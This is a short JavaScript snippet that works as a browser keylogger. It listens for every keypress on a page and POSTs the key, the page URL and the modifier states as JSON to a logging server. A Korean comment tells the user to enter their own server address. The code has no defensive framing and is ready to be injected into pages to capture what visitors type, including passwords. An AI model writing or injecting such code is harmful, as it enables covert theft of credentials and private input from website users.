document.addEventListener('keydown', (event) => {
  key=event.key
  const xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://localhost:8080/log'); // 자신의 서버 주소 입력
  xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
  xhr.send(JSON.stringify({ 
    key: event.key, // 누른 키
    window: window.location.href, // 현재 페이지 링크
    keyCode: event,
    shiftKey: event.shiftKey,
    ctrlKey: event.ctrlKey,
    altKey: event.altKey,
    metaKey: event.metaKey,
  }));
});
